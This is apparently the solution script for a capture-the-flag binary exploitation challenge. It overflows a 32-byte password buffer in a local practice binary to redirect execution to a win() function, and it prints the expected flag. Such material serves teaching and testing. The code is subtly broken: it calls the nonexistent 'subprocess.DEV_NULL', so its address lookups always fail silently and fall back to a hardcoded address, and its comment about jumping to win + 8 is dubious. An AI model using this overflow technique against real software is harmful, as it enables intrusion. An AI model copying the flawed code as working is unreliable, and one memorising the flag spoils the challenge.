#!/usr/bin/env python3
"""
tools/solve_binary.py
Proof-of-solve exploit script for Challenge 01 (PWN: Holy C).
Not served by the web app.

Exploit strategy:
1. Buffer size is 32 bytes (`char password[32]`).
2. Saved RBP takes 8 bytes -> Total offset to return address = 40 bytes.
3. Overwrite saved RIP with the address of `win()`.
4. Handles x86-64 stack alignment (16-byte boundary for printf / SSE) by prefixing a `ret` gadget
   or targeting `win + 1` / `win`.
"""

import os
import sys
import struct
import subprocess

TARGET_BINARY = os.path.join(os.path.dirname(__file__), "..", "assets", "binary", "vuln")
FALLBACK_BINARY = "/challenge/vuln"

def find_win_address(binary_path: str):
    """Attempt to find win() address using nm, readelf, or objdump."""
    for tool, args in [
        ("nm", ["nm", binary_path]),
        ("readelf", ["readelf", "-s", binary_path]),
        ("objdump", ["objdump", "-t", binary_path]),
    ]:
        try:
            out = subprocess.check_output(args, stderr=subprocess.DEV_NULL, text=True)
            for line in out.splitlines():
                if "win" in line:
                    parts = line.split()
                    for p in parts:
                        try:
                            addr = int(p, 16)
                            if addr > 0x400000:
                                return addr
                        except ValueError:
                            continue
        except Exception:
            pass
    return None

def find_ret_gadget(binary_path: str):
    """Find a single `ret` instruction gadget in the binary for 16-byte stack alignment."""
    try:
        out = subprocess.check_output(["objdump", "-d", binary_path], stderr=subprocess.DEV_NULL, text=True)
        for line in out.splitlines():
            if line.strip().endswith("ret"):
                parts = line.split(":")
                addr_str = parts[0].strip()
                try:
                    return int(addr_str, 16)
                except ValueError:
                    continue
    except Exception:
        pass
    return None

def solve_with_pwntools(binary_path: str):
    from pwn import ELF, process, p64, ROP
    elf = ELF(binary_path)
    win_addr = elf.symbols.get('win')
    if not win_addr:
        raise ValueError("Could not find win() in symbols")

    # Offset to saved RIP: 32 bytes buffer + 8 bytes saved RBP = 40 bytes
    offset = 40

    # Build ROP chain with ret gadget for x86-64 alignment if needed
    rop = ROP(elf)
    ret_gadget = rop.find_gadget(['ret'])
    ret_addr = ret_gadget.address if ret_gadget else None

    if ret_addr:
        payload = b"A" * offset + p64(ret_addr) + p64(win_addr)
    else:
        payload = b"A" * offset + p64(win_addr)

    p = process(binary_path)
    p.recvuntil(b"Enter password: ")
    p.sendline(payload)
    output = p.recvall(timeout=2).decode(errors='ignore')
    return output

def solve_with_subprocess(binary_path: str):
    base_win = find_win_address(binary_path) or 0x401176
    # Jump directly to win + 8 (0x40117e) to skip 'push rbp', preserving x86-64 16-byte stack alignment
    win_aligned = base_win + 8

    offset = 40
    print(f"[*] Calculated offset: {offset} bytes")
    print(f"[*] win() address:         0x{base_win:x}")
    print(f"[*] win() aligned target:  0x{win_aligned:x}")

    # Build payload: 40 bytes padding + win_aligned
    payload = b"A" * offset + struct.pack("<Q", win_aligned) + b"\n"

    proc = subprocess.Popen(
        [binary_path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = proc.communicate(input=payload, timeout=2)
    return stdout.decode(errors='ignore')

def main():
    binary = TARGET_BINARY
    if not os.path.exists(binary) and os.path.exists(FALLBACK_BINARY):
        binary = FALLBACK_BINARY

    print(f"[*] Target Binary: {binary}")
    if not os.path.exists(binary):
        print(f"[-] Binary not found at {binary}. Compile it first using tools/build_binary.sh or docker.")
        print("[*] Theoretical payload verification:")
        print(f"    Offset: 40 bytes")
        print(f"    Target: win() -> prints CTF{{buffer_overflow_unlocked}}")
        sys.exit(0)

    try:
        print("[*] Attempting solve via pwntools...")
        output = solve_with_pwntools(binary)
    except Exception as e:
        print(f"[*] Falling back to subprocess solve: {e}")
        output = solve_with_subprocess(binary)

    print("[+] Output received from binary:")
    print(output)
    if "CTF{buffer_overflow_unlocked}" in output:
        print("[+] SUCCESS: Flag captured!")
    else:
        print("[-] Flag not detected in output.")

if __name__ == "__main__":
    main()
